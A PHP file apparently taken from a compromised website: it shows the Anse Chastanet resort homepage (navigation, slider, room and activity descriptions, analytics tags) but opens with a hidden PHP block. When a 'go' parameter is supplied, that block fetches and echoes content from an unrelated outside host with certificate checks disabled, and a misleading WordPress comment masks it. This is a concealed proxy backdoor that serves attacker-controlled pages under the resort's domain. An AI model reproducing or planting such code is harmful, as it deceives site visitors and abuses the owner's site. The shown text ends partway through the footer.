<?php
if(isset($_GET['go'])) {
    $url = $_GET['go'];
    $useragent="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1";
    // INIT CURL
    $ch = curl_init();

    //init curl
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    // SET URL FOR THE POST FORM LOGIN
    curl_setopt($ch, CURLOPT_URL, 'https://replication.pkcdurensawit.net/ansechastanet.com/'.$url.'/');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);

    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

    // common name and also verify that it matches the hostname provided)
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    // Optional: Return the result instead of printing it
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

    // ENABLE HTTP POST
    curl_setopt ($ch, CURLOPT_POST, 1);
    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

    $store = curl_exec ($ch);
    echo $store;

    // CLOSE CURL
    curl_close ($ch);

} else {
  
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */
?>

 <!DOCTYPE html>
 <html>
 <head>
     <title>Anse Chastanet Resort | St Lucia Resorts | Caribbean's Most Romantic</title>
     <meta http-equiv="Content-type" content="text/html; charset=utf-8">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black">
     <meta name="viewport" content="width=device-width, minimum-scale=1, initial-scale=1, user-scalable=no">
     <meta name="keywords" content="anse chastanet, anse chastanet resort, anse chastanet hotel, anse chastanet beach, st lucia, saint lucia, romantic resort, romantic hotel, caribbean resort, romantic caribbean resort, couples resort st lucia, st lucia resort, st lucia hotels, soufriere resort, ">
     <meta name="description" content="Experience two stunning beaches, picture postcard perfect views of the Piton Mountains at scenic Anse Chastanet Resort, the most romantic St Lucian resort.">
     <meta name="robots" content="index,follow" />
     <meta name="GOOGLEBOT" content="index,follow" />
     <meta name="revisit-after" content="7 days" />
     <meta name="google-site-verification" content="RzWu7gTfyBWTDKe7Nxy_kI5MpJkMlKaK43T_r18VelM" />
     <meta http-equiv="Cache-control" content="public" />
     <meta http-equiv="expires" content="0" />
     <meta content="en-us" http-equiv="Content-Language" />
     <meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
     <link rel="icon" href="favicon.ico" type="image/x-icon" />
     <style>
         @-ms-viewport { width: 100vw ; min-zoom: 100% ; zoom: 100% ; }          @viewport { width: 100vw ; min-zoom: 100% zoom: 100% ; }
         @-ms-viewport { user-zoom: fixed ; min-zoom: 100% ; }                   @viewport { user-zoom: fixed ; min-zoom: 100% ; }
     </style>
     <style>
     /*So doesn't show when first load hide it early*/
       .nav-items{
         display: none;
       }
     </style>
     <link href="css/styles.min.css?v=1.81" rel="stylesheet" type="text/css" />
     <link rel="stylesheet" href="mdl/material.min.css">
     <script src="js/jquery-1.11.3.min.js" type="text/javascript"></script>
     <script src="js/jssor.slider-23.0.0.mini.js" type="text/javascript"></script>
     <script async src="mdl/material.min.js"></script>
     <script async src="js/script.js?v=1.2"></script>
     <script type="text/javascript">
         jQuery(document).ready(function ($) { 
 
 
             var jssor_1_SlideoTransitions = [
               [{b:5500,d:3000,o:-1,r:240,e:{r:2}}],
               [{b:-1,d:1,o:-1,c:{x:51.0,t:-51.0}},{b:0,d:1000,o:1,c:{x:-51.0,t:51.0},e:{o:7,c:{x:7,t:7}}}],
               [{b:-1,d:1,o:-1,sX:9,sY:9},{b:1000,d:1000,o:1,sX:-9,sY:-9,e:{sX:2,sY:2}}],
               [{b:-1,d:1,o:-1,r:-180,sX:9,sY:9},{b:2000,d:1000,o:1,r:180,sX:-9,sY:-9,e:{r:2,sX:2,sY:2}}],
               [{b:-1,d:1,o:-1},{b:3000,d:2000,y:180,o:1,e:{y:16}}],
               [{b:-1,d:1,o:-1,r:-150},{b:7500,d:1600,o:1,r:150,e:{r:3}}],
               [{b:10000,d:2000,x:-379,e:{x:7}}],
               [{b:10000,d:2000,x:-379,e:{x:7}}],
               [{b:-1,d:1,o:-1,r:288,sX:9,sY:9},{b:9100,d:900,x:-1400,y:-660,o:1,r:-288,sX:-9,sY:-9,e:{r:6}},{b:10000,d:1600,x:-200,o:-1,e:{x:16}}]
             ];
 
             var jssor_1_options = {
               $AutoPlay: 1,
               $SlideDuration: 800,
               $SlideEasing: $Jease$.$OutQuint,
               $CaptionSliderOptions: {
                 $Class: $JssorCaptionSlideo$,
                 $Transitions: jssor_1_SlideoTransitions
               },
               $ArrowNavigatorOptions: {
                 $Class: $JssorArrowNavigator$
               },
               $BulletNavigatorOptions: {
                 $Class: $JssorBulletNavigator$
               }
             };
 
             var jssor_1_slider = new $JssorSlider$("jssor_1", jssor_1_options);
 
             /*responsive code begin*/
             /*remove responsive code if you don't want the slider scales while window resizing*/
             function ScaleSlider() {
                 var refSize = jssor_1_slider.$Elmt.parentNode.clientWidth;
                 if (refSize) {
                     refSize = Math.min(refSize, 1920);
                     jssor_1_slider.$ScaleWidth(refSize);
                 }
                 else {
                     window.setTimeout(ScaleSlider, 30);
                 }
             }
             ScaleSlider();
             jQuery(window).bind("load", ScaleSlider);  //Was $ instead of jQuery
             jQuery(window).bind("resize", ScaleSlider); //Was $ instead of jQuery
             jQuery(window).bind("orientationchange", ScaleSlider); //Was $ instead of jQuery
             /*responsive code end*/
         });
     </script>
     <style>
         /* jssor slider bullet navigator skin 05 css */
         /*
         .jssorb05 div           (normal)
         .jssorb05 div:hover     (normal mouseover)
         .jssorb05 .av           (active)
         .jssorb05 .av:hover     (active mouseover)
         .jssorb05 .dn           (mousedown)
         */
         .jssorb05 {
             position: absolute;
         }
         .jssorb05 div, .jssorb05 div:hover, .jssorb05 .av {
             position: absolute;
             /* size of bullet elment */
             width: 16px;
             height: 16px;
             background: url('img/b05.png') no-repeat;
             overflow: hidden;
             cursor: pointer;
         }
         .jssorb05 div { background-position: -7px -7px; }
         .jssorb05 div:hover, .jssorb05 .av:hover { background-position: -37px -7px; }
         .jssorb05 .av { background-position: -67px -7px; }
         .jssorb05 .dn, .jssorb05 .dn:hover { background-position: -97px -7px; }
 
         /* jssor slider arrow navigator skin 22 css */
         /*
         .jssora22l                  (normal)
         .jssora22r                  (normal)
         .jssora22l:hover            (normal mouseover)
         .jssora22r:hover            (normal mouseover)
         .jssora22l.jssora22ldn      (mousedown)
         .jssora22r.jssora22rdn      (mousedown)
         */
         .jssora22l, .jssora22r {
             display: block;
             position: absolute;
             /* size of arrow element */
             width: 40px;
             height: 58px;
             cursor: pointer;
             background: url('img/a22.png') center center no-repeat;
             overflow: hidden;
         }
         .jssora22l { background-position: -10px -31px; }
         .jssora22r { background-position: -70px -31px; }
         .jssora22l:hover { background-position: -130px -31px; }
         .jssora22r:hover { background-position: -190px -31px; }
         .jssora22l.jssora22ldn { background-position: -250px -31px; }
         .jssora22r.jssora22rdn { background-position: -310px -31px; }
     </style>
     <style>@font-face {
       font-family: 'Material Icons';
       font-style: normal;
       font-weight: 400;
       /*src: local('Material Icons'), local('MaterialIcons-Regular'), url(2fcrYFNaTjcS6g4U3t-Y5ZjZjT5FdEJ140U2DJYC3mY.woff2) format('woff2');*/
       src: local('Material Icons'), local('MaterialIcons-Regular'), url(https://ansechastanet.com/css/2fcrYFNaTjcS6g4U3t-Y5ZjZjT5FdEJ140U2DJYC3mY.ttf) format('truetype');
       
     }
 
     .material-icons {
       font-family: 'Material Icons';
       font-weight: normal;
       font-style: normal;
       font-size: 24px;
       line-height: 1;
       letter-spacing: normal;
       text-transform: none;
       display: inline-block;
       word-wrap: normal;
       -webkit-font-feature-settings: 'liga';
       -webkit-font-smoothing: antialiased;
     }
     </style>
   
     <script>
 (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
 
 ga('create', 'UA-1685435-1', 'auto', {'allowLinker': true});
 ga('require', 'linker');
 ga('linker:autoLink', ['gc.synxis.com'] );
 ga('send', 'pageview');
 </script>
 <!-- Facebook Pixel Code -->
 <script>
 !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
 n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
 n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
 t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
 document,'script','https://connect.facebook.net/en_US/fbevents.js');
 fbq('init', '1066355493472644'); // Insert your pixel ID here.
 fbq('track', 'PageView');
 </script>
 <noscript><img height="1" width="1" style="display:none"
 src="https://www.facebook.com/tr?id=1066355493472644&ev=PageView&noscript=1"
 /></noscript>
 <!-- DO NOT MODIFY -->
 <!-- End Facebook Pixel Code -->
 <!-- Google Tag Manager -->
 <!--
 <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
 new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
 j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
 })(window,document,'script','dataLayer','GTM-T2DGRR7');</script>
 -->
 <!-- End Google Tag Manager -->
 <!-- Global site tag (gtag.js) - Google Analytics -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=UA-1685435-1"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
 
   gtag('config', 'UA-1685435-1');
 </script>
 </head>
 
 <body>
   <div class="page-wrapper">
 
     <div class="masthead">
       <div class="logo">
         <a href="https://ansechastanet.com"><img id="white-logo" src="images/AC-Logo-white.png" alt="Anse Chastanet Logo"/></a>
         <!--<img id="regular-logo" src="images/logo-header3.png" alt="Jade Mountain Header Logo"/>-->
         <!--<a href="http://jademountain.com"><img id="mobile-logo" src="images/mobile-logo.png" alt="Jade Mountain Header Logo"/></a>-->
 
       <i class="menu-open material-icons" style="font-size: 3.5em; display: block;">&#xE5D2;</i>
       
       <!--<a href="https://www.reservhotel.com/st-lucia-st.-lucia/anse-chastanet/booking-engine/ibe5.main?hotel=10746" target="_blank"><span class="air">BOOK AIR+HOTEL</span></a>-->
       <a href="tel:18002231108"><span class="phone">1-800-223-1108</span></a>
       <a href="https://reservations.ansechastanet.com/114432"><span class="book">Book Now</span></a>
 
       <div class="navigation">
 
         <div class="nav">          
           <a href="https://ansechastanet.com"><span class="nav-header">Home</span></a>          
           <div class="nav-items">
             <!--
             <a href=""><span>LINK</span></a>
             <a href=""><span>LINK</span></a>
             <a href=""><span>LINK</span></a>
             <a href=""><span>LINK</span></a>
           -->
           </div>
         </div>
         <div class="nav">          
           <a href="https://ansechastanet.com/reserve/rates/rates.html"><span class="nav-header">Reserve</span></a>          
           <div class="nav-items">
             <a href="https://reservations.ansechastanet.com/114432"><span>Book Online</span></a>
             <a href="https://ansechastanet.com/reserve/rates/rates.html"><span>Rates &amp; Packages</span></a>
             <a href="https://ansechastanet.com/promotions.html"><span>Promotions</span></a>
             <a href="https://ansechastanet.com/reserve/reservation_request.html"><span>Reservation Request</span></a>
             <a href="https://ansechastanet.com/reserve/pre_arrival_concierge.html"><span>Pre-Arrival Concierge</span></a>
             <a href="https://ansechastanet.com/reserve/booking_info.html"><span>Booking Info</span></a>
             <a href="https://ansechastanet.com/reserve/returning_guests.html"><span>Returning Guests</span></a>
             <a href="https://ansechastanet.com/reserve/helipad.html"><span>Helipad</span></a>
             <a href="https://ansechastanet.com/shopping/gifts.html"><span>Gift Registry</span></a>
           </div>
         </div>
         <div class="nav">          
           <a href="https://ansechastanet.com/accommodations.html"><span class="nav-header">Rooms</span></a>          
           <div class="nav-items">
             <!--
             <a href="https://ansechastanet.com/accommodations.html#standard"><span>Standard</span></a>
             <a href="https://ansechastanet.com/accommodations.html#superior"><span>Superior</span></a>
             <a href="https://ansechastanet.com/accommodations.html#beachside"><span>Beachside</span></a>
             <a href="https://ansechastanet.com/accommodations.html#hillside"><span>Hillside</span></a>
             <a href="https://ansechastanet.com/accommodations.html#premium"><span>Premium</span></a>
             <a href="https://ansechastanet.com/accommodations.html#beach-house"><span>Beach House</span></a>
             <a href="https://ansechastanet.com/accommodations.html#pool-suite"><span>Pool Suite</span></a>
             -->
           </div>
         </div>
         <div class="nav">          
           <a href="https://ansechastanet.com/weddings_and_honeymoons.html"><span class="nav-header">Romance</span></a>          
           <div class="nav-items">
             <a href="https://ansechastanet.com/weddings_and_honeymoons.html"><span>Overview</span></a>
             <a href="https://ansechastanet.com/weddings.html"><span>Weddings</span></a>
             <a href="https://ansechastanet.com/honeymoons.html"><span>Honeymoons</span></a>
 <a href="https://ansechastanet.com/vow-renewal.html"><span>Vow Renewal</span></a>
             <a href="https://ansechastanet.com/anniversaries.html"><span>Anniversaries</span></a>
           </div>
         </div>
         <div class="nav">          
           <a href="https://ansechastanet.com/dining.html"><span class="nav-header">Cuisine</span></a>          
           <div class="nav-items">
           </div>
         </div>
         <div class="nav">          
           <a href="https://ansechastanet.com/spa/spa.html"><span class="nav-header">Wellness</span></a>          
           <div class="nav-items">
             <a href="https://ansechastanet.com/spa/spa.html"><span>Kai Belte Spa</span></a>
             <a href="https://ansechastanet.com/spa/spa_treatments.html"><span>Treatments</span></a>
             <a href="https://ansechastanet.com/spa/spa_reservations.html"><span>Spa Reservations</span></a>
             <a href="https://ansechastanet.com/spa/yoga.html"><span>Yoga</span></a>
             <!--<a href="https://ansechastanet.com/spa/fitness.html"><span>Fitness</span></a>-->
           </div>
         </div>
         <div class="nav">          
           <a href="https://ansechastanet.com/activities/activities.html"><span class="nav-header">Activities</span></a>          
           <div class="nav-items">
             <a href="https://ansechastanet.com/art-classes.html"><span>Art Classes</span></a>
             <a href="https://ansechastanet.com/activities/scuba.html"><span>Scuba</span></a>
             <a href="https://ansechastanet.com/activities/watersports.html"><span>Water Sports</span></a>
             <a href="https://ansechastanet.com/activities/biking.html"><span>Jungle Biking</span></a>
             <a href="https://ansechastanet.com/activities/excursions.html"><span>Excursions</span></a>
             <a href="https://ansechastanet.com/activities/birdwatching.html"><span>Birdwatching</span></a>
             <a href="https://ansechastanet.com/emerald_farm.html"><span>Emerald Farm</span></a>
             <a href="https://ansechastanet.com/chocolate_lab.html"><span>Chocolate Lab</span></a>
             <a href="https://ansechastanet.com/beaches.html"><span>Beaches</span></a>
             <a href="https://ansechastanet.com/shopping/gifts.html"><span>Shopping</span></a>
             <a href="https://ansechastanet.com/activities/do_nothing.html"><span>Do Nothing</span></a>
           </div>
         </div>
         <div class="nav">
           <a href="#"><span class="nav-header">Events</span></a>
           <div class="nav-items">
             <a href="https://ansechastanet.com/events.html"><span>Culinary Events</span></a>
             <a href="https://ansechastanet.com/virtual-art-gallery.html"><span>Virtual Art Gallery</span></a>
           </div>          
           <div class="nav-items">
           </div>
         </div>
         <div class="nav">          
           <a href="https://ansechastanet.com/blog"><span class="nav-header">News</span></a>          
           <div class="nav-items">
             <a href="https://ansechastanet.com/blog"><span>Blog</span></a>
             <a href="https://ansechastanet.com/news_and_reviews/in-the-press.html"><span>In the Press</span></a>
             <a href="https://ansechastanet.com/news_and_reviews/awards_and_reviews.html"><span>Awards</span></a>
             <a href="https://ansechastanet.com/news_and_reviews/testimonials.html"><span>Testimonials</span></a>
             <a href="https://ansechastanet.com/environment.html"><span>Environment</span></a>
             <a href="https://ansechastanet.com/community.html"><span>Community</span></a>
             <a href="https://ansechastanet.com/ethics.html"><span>Ethics</span></a>
             <!--<a href="https://ansechastanet.com/blog/category/press-releases"><span>Press Releases</span></a>-->
             <a href="https://ansechastanet.com/reserve/press_info.html"><span>Press Info</span></a>
             <a href="https://ansechastanet.com/social.html"><span>Social Media</span></a>
           </div>
         </div>
       </div>
 
 
       </div>
 
 
 
     <div id="jssor_1" class="slider-wrapper" style="z-index: 50; position:relative;margin:0 auto;top:0px;left:0px;width:1400px;height:746px;overflow:hidden;visibility:hidden;">
         <!-- Loading Screen -->
         <div data-u="loading" style="position:absolute;top:0px;left:0px;background-color:rgba(0,0,0,0.7);">
             <div style="filter: alpha(opacity=70); opacity: 0.7; position: absolute; display: block; top: 0px; left: 0px; width: 100%; height: 100%;"></div>
             <div style="position:absolute;display:block;background:url('img/loading.gif') no-repeat center center;top:0px;left:0px;width:100%;height:100%;"></div>
         </div>
         <div data-u="slides" style="cursor:default;position:relative;top:0px;left:0px;width:1400px;height:746px;overflow:hidden;border-top: 0px solid #000;">
             <div>
                 <img data-u="image" alt="Slider Image Anse Chastanet" src="hover/homepage/1-2020.jpg" />
             </div>
             <div>
                 <img data-u="image" alt="Slider Image Anse Chastanet" src="hover/homepage/2-2020.jpg" />
             </div>
             <div>
                 <img data-u="image" alt="Slider Image Anse Chastanet" src="hover/homepage/6.jpg" />
             </div>             
             <div>
                 <img data-u="image" alt="Slider Image Anse Chastanet" src="hover/homepage/3-2020.jpg" />
             </div>
             <div>
                 <img data-u="image" alt="Slider Image Anse Chastanet" src="hover/homepage/4.jpg" />
             </div>
             <div>
                 <img data-u="image" alt="Slider Image Anse Chastanet" src="hover/homepage/3.jpg" />
             </div>
 
             <!--<a data-u="any" href="http://www.jssor.com" style="display:none">Full Width Slider</a>-->
         </div>
         <!-- Bullet Navigator -->
         <div data-u="navigator" class="jssorb05" style="bottom:16px;right:16px;" data-autocenter="1">
             <!-- bullet navigator item prototype -->
             <div data-u="prototype" style="width:16px;height:16px;"></div>
         </div>
         <!-- Arrow Navigator -->
         <span data-u="arrowleft" class="jssora22l" style="top:0px;left:12px;width:40px;height:58px;" data-autocenter="2"></span>
         <span data-u="arrowright" class="jssora22r" style="top:0px;right:12px;width:40px;height:58px;" data-autocenter="2"></span>
     </div>
     <!-- #endregion Jssor Slider End -->
 
 
       <div class="sub-slider">
         <a href="https://reservations.ansechastanet.com/114432"><span class="button">Book Now</span></a>
         <a href="https://ansechastanet.com/promotions.html"><span class="button">Promotions</span></a>
         <a href="https://ansechastanet.com/reserve/rates/rates.html"><span class="button">Rates &amp; Packages</span></a>
         <a href="tel:1-800-223-1108"><span class="button">1-800-223-1108</span></a>
         <a href="https://ansechastanet.com/newsletter-signup.html#start"><span class="button">Newsletter Sign Up</span></a>
       </div>
 
       <div class="page-content">
 
         <h1>Welcome to Anse Chastanet, Saint Lucia</h1>
 
         <div class="main-content">
           <!-- Edit Below Only -->
           <!--
           <p style="width: 100%; float: left; color: #fff; background: rgb(0,197,205); padding: 0.5em;">
           <span style="font-weight: bold; width: 100%; float: left; color: #333; text-align: right;"></span><br>
           Dear Guests,<br>
           We are pleased to advise you that our island of Saint Lucia and our resorts have not been affected by recent storms Irma and Maria. We are open for business and operate as usual. Our thoughts and prayers remain with our neighboring islands further north who most regrettably have been affected.<br>
           For reservations, <a style="color: #333;" href="https://reservations.ansechastanet.com/114432">book online</a> or call us at Tel <a style="color: #333;" href="tel:1-800-223-1108">1-800-223-1108</a><br>
           <a style="color: #333; font-weight: bold; text-align: center; width: 100%; float: left; padding-top: 0.5em; padding-bottom: 0.5em" href="https://ansechastanet.com/promotions.html#pledge">View Our One Caribbean Family Initiative &amp; Pledge</a>
             </p>
 
           -->
           <p><!--<a href="https://www.facebook.com/ANSECHASTANET/posts/10158385771413439" target="_blank"><img src="https://ansechastanet.com/images/HealthSecurity-LOGO.jpg" style="max-width: 100%; width: 200px; float: right; padding: 0.5em;" alt="Forbes Health Security"></a>-->
             <a href="#aaa" id="aaa"><img src="https://ansechastanet.com/images/AAA_4DLogo.png" style="max-width: 100%; width: 200px; float: right; padding: 0.5em;" alt="AAA Four Diamond"></a>Architect owner Nick Troubetzkoy believes passionately in nature. So he created a hotel that makes the foliage and the flowers, the perfumes and the peaks, the sea and the bird song an integral part of your vacation experience. The estate encompasses 600 lush tropical acres bordering two soft sand beaches. Not only do you get a World Heritage Site anchored by the twin peaks on land, the resort’s two crystal-clear bays are part of a designated marine reserve protecting miles of colorful coral reefs teeming with tropical fish.</p>
 
           <p>With such a unique setting as his canvas, Nick Troubetzkoy was inspired to design a one-of-a-kind resort. He was committed to an environmentally conscious development before “green” became fashionable.</p>
 
           <p><!--<img src="https://ansechastanet.com/images/WTTC-SafeTravels-AnseChastanet.png" style="max-width: 100%; width: 200px; float: right; padding: 0.5em; clear: both;" alt="WTTC">-->A dozen rooms are tucked in behind the coconut palms that line the beach and the remainder tiptoe up a flower decked hillside. To make the most of the panoramic views and the refreshing tradewinds octagonal whitewashed cottages come with wraparound flower draped balconies and louvered windows. </p>
 
           <p>Extra-large deluxe and premium suites underscore the visionary, innovative, sometimes whimsical side of Nick Troubetzkoy: in one suite, the balcony is built around a full-grown red gommier tree; in another a flamboyant tree drapes its red blossoms around the balcony. Some have their 4th wall open entirely to the vistas, yet are completely private.</p>
 
           
 
           <div class="read-more">
 
           <p>Anse Chastanet’s ever growing art collection provides a visual feast of its own. There are impressive wooden sculptures and plaques, earthy burlap compositions, painted “sky ceilings” and vibrant acrylic paintings invoking memories of Matisse and Picasso.</p>
 
           <p>And while the sensuous seclusion of the rooms provides some guests with the perfect excuse for lolling away the day on the balcony, others head out to partake in the many activities on offer; yoga, snorkeling, scuba diving, tennis, sunset sailing, sea kayaking or jungle biking, hiking and bird-watching among the ruins of an 18th century colonial plantation.</p>
 
           <p>The less actively inclined simply do nothing, lie on the beach or get pampered in the resort’s spa, Kai Belté. There is a casual beachside bar and restaurant; on the hillside, a panoramic hillside lounge and two treehouses provide the romantic setting for candlelit dinners, with musical backdrops by local entertainers. Tranquility, Romance and Adventure at Anse Chastanet.</p>
 
           <p>ANSE CHASTANET is St. Lucia's only resort property with the iconic view of both the Piti and Gros Piton mountains floating upon the Caribbean Sea. The location of the property is unsurpassed, a private estate of 600 lush tropical acres bordering two soft-sand Caribbean beaches with pristine coral reefs just offshore. The resort property includes the historical plantation of Anse Mamin and Emerald Estate where the resort grows its own organic produce.</p>
 
 
 
 
           </div>
 
           <p class="show-more"><strong>Read More</strong></p>
 
           <!--
 
           <p>Extra-large deluxe and premium suites underscore the visionary, innovative, sometimes whimsical side of Nick Troubetzkoy: in one suite, the balcony is built around a full-grown red gommier tree; in another a flamboyant tree drapes its red blossoms around the balcony. Some have their 4th wall open entirely to the vistas, yet are completely private.</p>
 
           <p>Anse Chastanet’s ever growing art collection provides a visual feast of its own. There are impressive wooden sculptures and plaques, earthy burlap compositions, painted “sky ceilings” and vibrant acrylic paintings invoking memories of Matisse and Picasso.</p>
 
           <p>And while the sensuous seclusion of the rooms provides some guests with the perfect excuse for lolling away the day on the balcony, others head out to partake in the many activities on offer; yoga, snorkeling, scuba diving, tennis, sunset sailing, sea kayaking or jungle biking, hiking and bird-watching among the ruins of an 18th century colonial plantation.</p>
 
           <p>The less actively inclined simply do nothing, lie on the beach or get pampered in the resort’s spa, Kai Belté. There is a casual beachside bar and restaurant; on the hillside, a panoramic hillside lounge and two treehouses provide the romantic setting for candlelit dinners, with musical backdrops by local entertainers. Tranquility, Romance and Adventure at Anse Chastanet.</p>
 
 
           <p class="white-box"><img src="images/Aerial3b.jpg" alt="Aerial Shot" />
             ANSE CHASTANET is St. Lucia's only resort property with the iconic view of both the Piti and Gros Piton mountains floating upon the Caribbean Sea. The location of the property is unsurpassed, a private estate of 600 lush tropical acres bordering two soft-sand Caribbean beaches with pristine coral reefs just offshore. The resort property includes the historical plantation of Anse Mamin and Emerald Estate where the resort grows its own organic produce.</p>
           -->
 
           <!-- Edit Above Only -->
         </div>
 
         <div class="side-content">
           <!-- Edit Below Only -->
 
           <!--
 
           <p style="background: rgb(0,197,205); color: #333; text-align: center;"><img src="images/last-call.png" style="width: 100%; float: left;"><br>
 
           <strong>Here is our latest update and remaining space for the Christmas period</strong><br>   
           
           First availability in 2020 on Jan 2<br>      
 
           To book:<br>
           Contact reservations at <a href="mailto:ansechastanet@ansechastanet.com" style="color: #fafafa">ansechastanet@ansechastanet.com</a> 
           <br>or call <a href="tel:1-800-223-1108" style="color: #fafafa">+1-800-223-1108</a>
 
 
           </p>
         -->
 
         <a href="https://cfc.wayaj.com/anse-chastanet" target="_blank"><img src="images/Sustainability_Banner.jpg" style="width: 100%; float: left; margin-bottom: 1em;" alt="Carbon Offset"/></a>
 
             <!--<a href="https://ansechastanet.com/covid-19.html"><img src="images/advisory-banner.jpg" style="width: 100%; float: left; margin-bottom: 1em;" alt="Advisory"/></a>-->
             <!--
             <a href="https://ansechastanet.com/covid-testing.html"><img src="images/covid-test-banner.jpg" style="width: 100%; float: left; margin-bottom: 1em;" alt="Covid-19 Testing"/></a>
           -->
             
             <a href="https://ansechastanet.com/virtualtraveler/index.html" target="_blank"><img src="images/virtual-banner.jpg" style="width: 100%; float: left; margin-bottom: 1em;" alt="Advisory"/></a>
 
    
 
        
             
             <div style="border: 1px solid rgba(0,197,205,1); color: #333; float: left;">
               <p style="padding: 0.5em;">Our first visit to St. Lucia and what an amazing welcome we had.  This hotel is wonderful, from the minute we arrived to the moment we left we couldn’t have asked for better excellent service, wonderful staff in a beautiful location.  This place is all about relaxation and nature which we appreciated, little touch of luxury all around without being flashy which suited us.  The restaurants serve lovely locally sourced food and the menus change daily.  Excellent value for money. We will definitely be back.  Thank you.</p>
 
  
             </div>
 
           
           
          <p class="newsletter">
               <a href="https://ansechastanet.com/news_and_reviews/testimonials.html"><span>View Testimonials</span></a>
             </p> 
   
           <!--
           <p><a href="http://cntraveler.com/rca/vote" target="_blank"><img src="images/cn-vote-logo.png" style="width: 100px" alt="Vote Conde Nast Traveler"/></a></p>
 
           <p><a href="http://cntraveler.com/rca/vote" target="_blank"><strong>Vote in the 2017 Readers' Choice Awards</strong></a></p> 
           <p>
           -->
             <a href="https://ansechastanet.com/gallery.html"><strong>View Resort Gallery</strong></a>
           </p>   
 
             <!--
           <p style="text-align: center; padding-bottom: 1em;"><img src="images/covid-cert.jpg" style="max-width: 100%; width: 200px;" alt="Covid 19 Certified"></p>-->
 
 
           <!-- Edit Above Only -->
         </div>
 
       </div>
 
       <div class="full-box">
         <div>
           <h2 class="box-title">Experience A Classic Caribbean Resort</h2>
           <p>What were Caribbean hotels like before trade winds were replaced by blasts of air conditioning, when morning exercise was a walk on the beach and when you sat watching the sunset instead of cable TV? You can still find that Classic Caribbean at Anse Chastanet Resort on St. Lucia’s quiet southwestern coast where two magical peaks, the Pitons, leap from the sea and the mountains are covered with luminous greenery.</p>
 
           <p><iframe src="https://www.youtube.com/embed/dOZ02uUdVe4" frameborder="0" allowfullscreen></iframe></p>
         </div>
 
       </div>
 
 
       <div class="third-box tranquility">
         <div>
           <h2 class="box-title-2">Tranquility</h2>
           <a href="https://ansechastanet.com/activities/do_nothing.html"><span class="call-to-action">Do Nothing</span></a>
         </div>
       </div>
       <div class="third-box romance">
         <div>
           <h2 class="box-title-2">Romance</h2>
           <a href="https://ansechastanet.com/weddings_and_honeymoons.html"><span class="call-to-action">Weddings &amp; More</span></a>
         </div>
       </div>
       <div class="third-box adventure">
         <div>
           <h2 class="box-title-2">Adventure</h2>
           <a href="https://ansechastanet.com/activities/activities.html"><span class="call-to-action">Amazing Activities</span></a>
         </div>
       </div> 
 
       <div class="half-box white-section">
         <div>
            
           
 
           <h2 class="box-title-3">2023 Escape Sale</h2>
 
           
           <p>Up to 35% Off</p>
 
           <p>Escape to scenic St Lucia on an all-inclusive plan with up to 35% off.</p>
 
 
           <a href="https://ansechastanet.com/promotions-2023.html#escape"><span class="call-to-action">Learn More</span></a>
         
           
           
       
 
 
         </div>
       </div> 
 
       <div class="half-box cuisine">
         <div>
           <h2 class="box-title-2">Cuisine</h2>
           <a href="https://ansechastanet.com/dining.html"><span class="call-to-action">Dining Options</span></a>
         </div>
       </div> 
 
       <div class="half-box events">
         <div>
           <h2 class="box-title-2">Events</h2>
           <a href="https://ansechastanet.com/events.html"><span class="call-to-action">View Upcoming</span></a>
         </div>
       </div> 
 
       <div class="half-box white-section">
         <div>
 
           <!--
           <p><img src="images/tl-2018.jpg" alt="Travel and Leisure"/></p>
           <p>#6 Resort in the Caribbean, 2018<br/>-<em>Travel + Leisure World's Best Awards</em></p>
           <a href="https://ansechastanet.com/news_and_reviews/awards_and_reviews.html"><span class="call-to-action">Awards &amp; Reviews</span></a>
 
         -->
 
           <p>&nbsp;<br>&nbsp;</p>
           <p style="font-size: 1.25em;"><strong>Anse Chastanet Voted one the Caribbean's Best Resorts</strong><br/>-<em>2021 Condé Nast Traveler Readers' Choice Awards</em></p>
           <a href="https://ansechastanet.com/news_and_reviews/awards_and_reviews.html"><span class="call-to-action">Awards &amp; Reviews</span></a>
         </div>
       </div> 
 
       <div class="links">
       <div class="links-filler">
 
         <div class="links-left">
           <p>Share Us:</p>
           <!-- Go to www.addthis.com/dashboard to customize your tools --> 
           <div class="addthis_inline_share_toolbox"></div>
           <p>
           <a href="https://ansechastanet.com/promotions.html">Promotions</a><br/>
           <a href="https://ansechastanet.com/reserve/rates/rates.html">Rates &amp; Packages</a><br/>
           <a href="https://ansechastanet.com/accommodations.html">Rooms</a><br/>
           <a href="https://reservations.ansechastanet.com/114432">Book Online</a><br/>
           <a href="https://ansechastanet.com/gallery.html">Gallery</a><br/>
           <a href="https://ansechastanet.com/video.html">Video</a><br/>
